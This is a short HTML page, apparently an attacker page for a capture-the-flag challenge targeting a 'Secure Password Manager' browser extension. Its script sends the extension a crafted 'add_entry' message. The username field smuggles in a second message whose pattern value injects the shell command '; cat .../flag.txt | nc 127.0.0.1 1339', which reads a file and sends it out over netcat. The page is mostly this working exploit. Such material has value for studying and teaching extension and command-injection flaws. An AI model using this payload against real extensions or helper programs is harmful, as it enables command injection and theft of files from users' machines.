<html>
  <body>
    <h1>Test page for Secure Password Manager</h1>
    <p>This page lets you test the password manager. Once you have it working, you can use it to log in below and continue on.</p>
  <div id="notice"></div>

  <form>
    <input type="text" name="username" placeholder="Username"><br/>
    <input type="password" name="password" placeholder="Password"><br/>
    <button>Login</button>
  </form>


  Cools the plugin works!<br> However the admin has your flag is in <code>/opt/problems/firstfail_9_fb7f1db7f59364d8901213581e8497af/flag.txt</code><br/>
  We want to test the plugin even more! <a href="/dovisit">Give us a url to visit!</a>

  <script>
window.onload = function() {
  if (window.PasswordManager === undefined) {
    document.getElementById('notice').innerHTML = `<h2 style="color:red">You do no have Secure Password Manager installed...</h2>`;
  } else {
    Promise.race([window.PasswordManager.ping(), new Promise((resolve, reject) => {
      setTimeout(reject,1000);
    })]).then((r)=>{
    	window.postMessage({
        	type:'add_entry',
        	host:"challenge.acictf.com:12457",
        	entry: "username=port.postMessage({type: 'entries',pattern: '; cat /opt/problems/firstfail_9_fb7f1db7f59364d8901213581e8497af/flag.txt | nc 127.0.0.1 1339'}),password=\"test\""
	}).then(function() {console.log('done')})
    }).catch(()=>{
	    window.PasswordManager.openManager()
      document.getElementById('notice').innerHTML = `<h2 style="color:red">You have the plugin installed, but the RPC is not installed correctly...</h2>`;
    });

  }
}
  </script>
  </body>
</html>
